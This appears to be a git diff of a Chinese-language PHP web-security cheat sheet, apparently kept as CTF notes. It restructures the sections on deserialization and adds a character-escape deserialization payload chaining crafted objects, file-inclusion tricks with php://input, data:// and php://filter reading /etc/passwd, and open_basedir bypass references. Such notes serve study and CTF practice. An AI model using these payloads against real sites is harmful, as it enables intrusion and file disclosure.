@@ -33,7 +33,9 @@ sha1('aaO8zKZF')
 sha1('aa3OFF9m')
 ```
 
-## 反序列化魔术方法
+## 反序列化
+
+### 反序列化魔术方法
 
 ```php
 __construct()//当一个对象创建时被调用
@@ -47,7 +49,7 @@ __invoke()//调用函数的方式调用一个对象时的回应方法
 __call()//当调用一个对象中的不能用的方法的时候就会执行这个函数
 ```
 
-## public、protected与private在序列化时的区别
+### public、protected与private在序列化时的区别
 
 >protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前面会加上\0*\0的前缀。这里的 \0 表示 ASCII 码为 0 的字符(不可见字符)，而不是 \0 组合。这也许解释了，为什么如果直接在网址上，传递\0*\0username会报错，因为实际上并不是\0，只是用它来代替ASCII值为0的字符。
 
@@ -105,7 +107,7 @@ echo $a;
 O:4:"Name":2:{s:14:"\0Name\0username";s:5:"admin";s:14:"\0Name\0password";i:100;}
 ```
 
-## ``__wakeup()``方法绕过
+### ``__wakeup()``方法绕过
 
 作用：
 与``__sleep()``函数相反，``__sleep()``函数，是在序序列化时被自动调用。``__wakeup()``函数，在反序列化时，被自动调用。
@@ -123,6 +125,37 @@ O:4:"Name":2:{s:14:"\0Name\0username";s:5:"admin";s:14:"\0Name\0password";i:100;
 
 ```
 O:4:"Name":3:{s:14:"\0Name\0username";s:5:"admin";s:14:"\0Name\0password";i:100;}
+```
+
+### 利用字符逃逸进行非预期反序列
+
+#### 字符数增加
+
+构造属性向后溢出
+
+#### 字符数减少
+
+类前一个属性吃掉后一个属性的头部结构，是得后续类中的属性完全可控
+
+#### Example
+
+```php
+function add($data)
+{
+    $data = str_replace(chr(0).'*'.chr(0), '\0*\0', $data);
+    return $data;
+}
+
+function reduce($data)
+{
+    $data = str_replace('\0*\0', chr(0).'*'.chr(0), $data);
+    return $data;
+}
+
+/* \0*\0 -> reduce(add()) -> * 5 -> 3
+
+username=A\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0&password=AB";s:11:"\0*\0password";O:8:"Hacker_A":1:{S:5:"c2\6538";O:8:"Hacker_B":1:{S:5:"c2\6538";O:8:"Hacker_C":1:{s:4:"name";s:4:"test";}}}s:8:"\0*\0admin";i:1;}&submit=Login
+*/
 ```
 
 ## parse_url 绕过
@@ -421,6 +454,10 @@ https://www.cnblogs.com/wangtanzhi/p/12311239.html
 - ``eval(getallheaders(){'a'})``
 
     利用``HTTP``名为``a``的``header``传参
+- ``error_reporting(E_ALL);``
+    开启报错
+- ``getcwd()``
+    获得当前路径
 
 ### 参考资料
 
@@ -441,9 +478,9 @@ php://filter/convert.base64-encode/resource=index.php
 ```
 ### include
 
-- ``php://input`` + POST报文php代码
+- ``php://input`` + POST报文php代码  (allow_url_include=On)
 
-- ``data://text/plain,<phpcode>``
+- ``data://text/plain,<phpcode>`` (allow_url_include=On)
 
 - php7 ``php://filter/string.strip_tags=/etc/passwd`` 
   
@@ -455,6 +492,8 @@ php://filter/convert.base64-encode/resource=index.php
 ### 参考资料
 
 https://xz.aliyun.com/t/5535#toc-7
+
+php文件包含漏洞： https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/
 
 ## Phar 反序列化攻击
 
@@ -528,6 +567,11 @@ chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');ch
 ```
 
 分析：https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/
+
+
+### 扩展资料
+
+https://www.mi1k7ea.com/2019/07/20/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-open-basedir%E7%9A%84%E6%96%B9%E6%B3%95/
 
 ## 原生类反序列化
 
